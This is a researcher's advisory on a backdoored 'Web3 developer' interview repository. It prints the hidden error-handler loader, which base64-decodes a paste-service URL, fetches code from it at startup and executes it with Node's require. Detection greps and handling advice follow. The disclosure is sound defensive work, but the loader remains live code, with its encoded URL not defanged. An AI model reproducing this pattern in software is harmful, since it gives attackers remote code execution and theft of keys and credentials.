# RCE Backdoor in a Fake "Web3 Developer" Interview Test (TechPro-1/W3GLFun)

**Author:** Trygve Bundgaard — independent security researcher (GitHub: [@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))
**Discovered:** 2026-01-27
**Status:** Reported to GitHub Trust & Safety → repository removed after confirmed Terms-of-Service violation (2026-01-27)
**Severity:** Critical — unauthenticated remote code execution on the developer's workstation
**Type:** Social-engineering / supply-chain malware ("Contagious Interview" pattern)

> All indicators of compromise in this advisory are **defanged** (`hxxp`, `[.]`). Do not re-arm and visit them outside an isolated analysis environment.

## Summary

While reviewing a "technical test" for a Web3 Developer role sourced through a
freelancing platform, I found a **remote code execution backdoor** hidden in the
project's error handler. The moment the application starts, it fetches
JavaScript from a remote paste service and executes it with full Node.js
privileges — enough to read and write any file, run any command, and steal
wallet keys, SSH keys, and credentials. I caught it during a pre-run code
review, before `npm install`, so no code executed on my machine. I reported it
to GitHub, which removed the repository.

## The lure

The "client" shared a private GitHub repository as an interview task and pushed
for immediate execution — *"clone and check it on your side ASAP"* — with a
plausible task list (fix a login bug, improve landing-page responsiveness, add a
MetaMask/Phantom login). The urgency to run the code before reviewing it is the
tell.

## Technical analysis

### First stage — `server/errorHandler.cjs`

```javascript
const getCookie = async () => {
  try {
    const axios = require("axios");
    // base64 → remote payload URL (defanged below)
    const errCodeUrl = Buffer.from(
      "aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9IWTZN", "base64"
    ).toString("utf-8");
    const response = await axios.get(errCodeUrl);
    const errCode = response.data.errCode;
    // Executes remote code with Node's require() in scope — arbitrary RCE
    const errFunc = new (Function.constructor)("require", errCode);
    errFunc(require);
  } catch (err) {}
};
```

The base64 blob decodes to `hxxps://www[.]jsonkeeper[.]com/b/HY6M6`. The
`new (Function.constructor)("require", errCode)` pattern compiles attacker-
controlled text into a function and hands it `require`, so the remote payload
has the full Node.js standard library.

### Activation — `server/index.cjs`

`getCookie()` is called during server startup (line 32), so any developer who
runs `npm run dev` triggers it immediately. No interaction beyond starting the
app is required.

### Second stage

The payload at the decoded URL is ~15 KB of heavily obfuscated JavaScript:
`child_process` for command execution, multiple layers of character-substitution
obfuscation, host/user reconnaissance, and network exfiltration to a remote
server. Because the second stage is fetched at runtime, the operator can swap it
at any time without changing the repository.

### Supporting indicators

`package.json` requested needless or deprecated packages (`request`, the
built-ins `fs`/`path` as if they were installable, an obscure `execp`, and `pg`
for an app that uses SQLite) — consistent with obfuscating intent or padding the
dependency surface.

## Indicators of compromise (defanged)

| Indicator | Value |
|-----------|-------|
| Malicious repository | `github[.]com/TechPro-1/W3GLFun` (removed by GitHub) |
| Malicious org/account | `TechPro-1` |
| First-stage (base64) | `aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9IWTZN` |
| Decoded payload URL | `hxxps://www[.]jsonkeeper[.]com/b/HY6M6` |
| Code pattern | `new (Function.constructor)("require", <remote>)` in an "error handler" |
| Delivery | private GitHub repo sent as an interview "technical test" |

## Impact

A web3 developer's machine typically holds exactly what this steals: wallet
private keys, RPC/API keys, SSH keys, and cloud credentials. One `npm run dev`
is full compromise.

## Detection

Scan any untrusted repo (do **not** clone the one above — it's gone, and you
shouldn't re-arm it anyway):

```bash
# base64-encoded URLs hidden in source
grep -rn "Buffer.from(.*base64" --include=*.js --include=*.ts --include=*.cjs .
# dynamic code execution fed a remote value
grep -rn "Function.constructor" --include=*.js --include=*.ts --include=*.cjs .
# network fetches inside "error"/"handler" helpers
grep -rln "axios.get\|fetch(" --include=*error* --include=*handler* .
```

## Safe handling

- **Review before you run.** Read the source and `package.json` scripts before `npm install` / `npm run dev`.
- **Run untrusted code in a disposable VM or container**, never on your daily-driver with wallets and keys present.
- **Be skeptical of interview tasks that push you to execute immediately.**
- Treat base64-decoded URLs, `Function.constructor`, and remote-fetching "error handlers" as red flags.

## Disclosure timeline & outcome

- **2026-01-27** — Identified during pre-run code review. Reported to **GitHub Trust & Safety** and to the freelancing platform.
- **2026-01-27** — GitHub Trust & Safety confirmed enforcement:
  > "Our review of the account named in your report has concluded. We have determined that one or more violations of GitHub's Terms of Service have occurred and have taken appropriate action in response."
- The freelancing platform reviewed the report and stated it found no violation — a reminder that review standards differ across platforms.
- **No compromise:** the malware never executed; it was caught before `npm install`.

## Campaign context

The delivery method, the fake-interview lure aimed at web3 developers, and the
use of a JSON-paste service to host a swappable second stage are **consistent
with** the "Contagious Interview" activity publicly reported since 2023. I'm
documenting the concrete indicators here rather than asserting attribution.

---

*Published for the protection of the developer community. Indicators are
defanged. — Trygve Bundgaard ([@Ubuntu-Buddha](https://github.com/Ubuntu-Buddha))*
